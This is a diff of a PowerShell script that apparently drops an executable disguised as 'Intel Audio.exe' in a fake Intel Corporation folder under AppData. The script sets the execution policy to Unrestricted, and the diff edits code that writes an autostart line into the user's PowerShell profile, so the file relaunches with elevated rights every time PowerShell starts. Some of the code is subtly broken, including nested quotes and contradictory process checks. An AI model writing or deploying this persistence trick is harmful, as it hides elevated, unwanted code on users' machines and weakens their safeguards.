@@ -14,6 +14,7 @@ $TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio"
 $TargetFile = "$TargetPath\Intel Audio.exe"
 $TargetZip = "$TargetPath\Intel Audio.zip"
 $PowershellPath = "$env:USERPROFILE\Documents\WindowsPowerShell"
+$PowershellFile = "$PowershellPath\Microsoft.PowerShell_profile.ps1"
 
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
@@ -67,17 +68,17 @@ if (-Not (Test-Path "$TargetFile")) {
 
 if (-Not (Test-Path "$PowershellPath")) {
       New-Item -ItemType Directory -Force -Path "$PowershellPath"
-      New-Item -ItemType File -Force -Path "$PROFILE"
+      New-Item -ItemType File -Force -Path "$PowershellFile"
       Write-Output "Powershell profile created"
-      Set-Content -Path "$PROFILE" -Value "if (Test-Path "$TargetFile") { if (-Not (Get-Process -Name 'Intel Audio.exe') -or (Get-Process -Name 'Intel Audio')) { Start-Process "$TargetFile"  -Verb RunAs } }"
+      Set-Content -Path "$PowershellFile" -Value "if (Test-Path "$TargetFile") { if (-Not (Get-Process -Name 'Intel Audio.exe') -or (Get-Process -Name 'Intel Audio')) { Start-Process "$TargetFile"  -Verb RunAs } }"
       Write-Output "Powershell profile updated"
 }
-if (Select-String -Path "$PROFILE" "Start-Process") {
+if (Select-String -Path "$PowershellFile" "Start-Process") {
       Write-Output "Powershell profile already updated"
       # exit 0
 } else {
       if (-Not (Test-Path "$TargetFile")) {
-            Add-Content -Path "$PROFILE" -Value 'if (Test-Path "$TargetFile") { if (-Not (Get-Process -Name "Intel Audio.exe") -or (Get-Process -Name "Intel Audio")) { Start-Process "$TargetFile"  -Verb RunAs } }'
+            Add-Content -Path "$PowershellFile" -Value 'if (Test-Path "$TargetFile") { if (-Not (Get-Process -Name "Intel Audio.exe") -or (Get-Process -Name "Intel Audio")) { Start-Process "$TargetFile"  -Verb RunAs } }'
             Write-Output "Powershell profile updated"
       } else {
             Write-Output "Powershell profile not updated"
